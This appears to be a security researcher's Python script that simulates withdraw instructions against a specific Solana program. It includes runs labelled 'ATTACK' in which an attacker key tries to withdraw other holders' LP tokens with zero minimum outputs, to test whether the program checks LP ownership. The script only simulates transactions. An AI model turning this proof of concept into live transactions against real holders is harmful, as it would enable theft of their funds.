#!/usr/bin/env python3
"""Withdraw sims v3: zero-min variants to reach the burn stage (the decisive LP-ownership test)."""
import base64, json, sys
sys.path.insert(0, "/home/heisenberg/CA/armada/analysis")
from solrpc import *
from simtx import simulate, summarize

PROG = "ArmN3Av2boBg8pkkeCK9UuCN9zSUVc2UQg1qR2sKwm8d"
A = "/home/heisenberg/CA/armada/analysis"
s = json.load(open(f"{A}/ix-full-samples.json"))
w = s["withdraw"][0]
base = list(w["accounts"])
data = b58decode(w["data"])
lp_amount = int.from_bytes(data[8:16], "little")
data0 = data[:8] + data[8:16] + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
r1 = json.load(open(f"{A}/recon1.json"))
vault = base[4]
v = r1["vaults"][vault]
r6 = json.load(open(f"{A}/recon6_lpholders.json"))
holders = r6[vault]["top"]
cur = holders[0]

def metas(accts, signer_idx=0, ro=(4, 8, 9, 15)):
    return [(a, i == signer_idx, i not in ro) for i, a in enumerate(accts)]

def run(label, payer, accts, d, ret=None):
    ix = {"program_id": PROG, "accounts": metas(accts), "data": d}
    res = simulate([ix], payer, return_accounts=ret)
    summ = summarize(res)
    print(f"\n===== {label} ===== err={summ['err']} CU={summ.get('unitsConsumed')}")
    for l in summ["logs_tail"][-16:]:
        print("   ", l)
    return res, summ

atas = {}
for mint, tag in ((v["token_mint_a"], "a"), (v["token_mint_b"], "b")):
    r = rpc("getTokenAccountsByOwner", [cur["owner"], {"mint": mint}, {"encoding": "jsonParsed"}])
    vals = (r or {}).get("value") or []
    atas[tag] = vals[0]["pubkey"] if vals else None
print("holder ATAs:", atas, "LP ata:", cur["ata"], "balance:", cur["amount"])

a2 = list(base); a2[0] = cur["owner"]; a2[3] = cur["ata"]; a2[1] = atas["a"]; a2[2] = atas["b"]
ret = [a2[3], a2[1], a2[2], a2[5], a2[6], a2[7]]
res2, s2 = run("W2 self-withdraw min=0 (holderA)", cur["owner"], a2, data0, ret)

att = "2xFbZtJjR3szsVXrjVwU35uA9uk35xujNufdUzPFsqFL"
a1 = list(base); a1[0] = att; a1[3] = cur["ata"]; a1[1] = atas["a"]; a1[2] = atas["b"]
res1, s1 = run("W1 ATTACK: payer=MMkey, LP=victim(holderA), min=0", att, a1, data0)

if len(holders) > 1:
    hb = holders[1]
    a1b = list(base); a1b[0] = att; a1b[3] = hb["ata"]; a1b[1] = atas["a"]; a1b[2] = atas["b"]
    run("W1b ATTACK: payer=MMkey, LP=holderB", att, a1b, data0)

if res2:
    print("\n--- W2 post accounts ---")
    for a in (res2.get("value") or {}).get("accounts") or []:
        if not a:
            continue
        raw = base64.b64decode(a["data"][0]); pk = a.get("pubkey")
        amt = int.from_bytes(raw[64:72], "little") if len(raw) > 72 else int.from_bytes(raw[36:44], "little")
        print(" ", pk[:12], "->", amt)
